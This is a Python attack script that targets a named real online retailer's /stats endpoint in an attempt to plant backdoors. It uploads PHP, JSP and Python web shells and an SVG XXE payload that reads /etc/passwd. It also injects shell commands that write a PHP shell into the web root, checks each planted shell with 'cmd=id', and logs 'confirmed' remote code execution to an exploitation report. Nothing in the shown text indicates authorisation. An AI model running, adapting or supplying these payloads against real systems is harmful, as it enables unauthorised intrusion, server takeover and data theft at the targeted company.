#!/usr/bin/env python3
"""Test POST to /stats for backdoor creation"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

found_vulns = []

print("[*] Testing POST to /stats for backdoor...\n")

# POST method is allowed on /stats (from OPTIONS)
# Try various payloads

# 1. Test file upload
print("[*] Testing file upload to /stats...")
backdoor_payloads = [
    ('backdoor.php', '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>', 'application/x-php'),
    ('backdoor.jsp', '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line); } } %>', 'application/x-jsp'),
    ('backdoor.py', '#!/usr/bin/env python3\nimport os\nimport sys\nos.system(sys.argv[1])', 'text/x-python'),
    ('exploit.svg', '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>', 'image/svg+xml'),
]

for filename, content, content_type in backdoor_payloads:
    try:
        files = {'file': (filename, content, content_type)}
        resp = s.post(f"{base}/stats", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            location = resp.headers.get('Location', '')
            if location:
                if not location.startswith('http'):
                    location = f"{base}{location}"
                try:
                    resp2 = s.get(f"{location}?cmd=id", timeout=5, verify=False)
                    if "uid=" in resp2.text or "root:" in resp2.text:
                        print(f"  [CRITICAL] Backdoor uploaded: {location}")
                        found_vulns.append({
                            "type": "backdoor_upload_stats",
                            "severity": "CRITICAL",
                            "endpoint": "/stats",
                            "filename": filename,
                            "uploaded_to": location
                        })
                except: pass
            # Check if XXE worked
            elif "root:" in resp.text or "root:x:0:0" in resp.text:
                print(f"  [CRITICAL] SVG XXE via /stats: {filename}")
                found_vulns.append({
                    "type": "svg_xxe_stats",
                    "severity": "CRITICAL",
                    "endpoint": "/stats",
                    "filename": filename,
                    "response": resp.text[:500]
                })
    except: pass

# 2. Test JSON payload with command injection
print("\n[*] Testing JSON payload with command injection...")
cmd_payloads = [
    {"command": "; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"},
    {"cmd": "| echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"},
    {"exec": "`echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php`"},
    {"run": "$(echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php)"},
]

for payload in cmd_payloads:
    try:
        resp = s.post(f"{base}/stats", json=payload, timeout=5, verify=False)
        if resp.status_code == 200:
            # Check if backdoor was created
            try:
                resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                if "uid=" in resp2.text or resp2.status_code == 200:
                    print(f"  [CRITICAL] Backdoor created via command injection: {payload}")
                    found_vulns.append({
                        "type": "backdoor_command_injection_stats",
                        "severity": "CRITICAL",
                        "endpoint": "/stats",
                        "payload": payload,
                        "backdoor_url": f"{base}/shell.php"
                    })
            except: pass
    except: pass

# 3. Test form data with command injection
print("\n[*] Testing form data with command injection...")
form_payloads = [
    {"file": "; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"},
    {"upload": "| echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"},
    {"data": "`echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php`"},
]

for payload in form_payloads:
    try:
        resp = s.post(f"{base}/stats", data=payload, timeout=5, verify=False)
        if resp.status_code == 200:
            # Check if backdoor was created
            try:
                resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                if "uid=" in resp2.text or resp2.status_code == 200:
                    print(f"  [CRITICAL] Backdoor created via form injection: {payload}")
                    found_vulns.append({
                        "type": "backdoor_form_injection_stats",
                        "severity": "CRITICAL",
                        "endpoint": "/stats",
                        "payload": payload,
                        "backdoor_url": f"{base}/shell.php"
                    })
            except: pass
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL backdoor vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        if 'backdoor_url' in v:
            print(f"    Backdoor URL: {v['backdoor_url']}")
        if 'filename' in v:
            print(f"    Filename: {v['filename']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - БЕКДОР СОЗДАН\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded To:** `{v['uploaded_to']}`\n\n")
            if 'backdoor_url' in v:
                f.write(f"**Backdoor URL:** `{v['backdoor_url']}`\n\n")
            if 'filename' in v:
                f.write(f"**Filename:** `{v['filename']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{json.dumps(v['payload'])}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- RCE на сервере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No backdoor vulnerabilities found via /stats POST")

print("=" * 70)

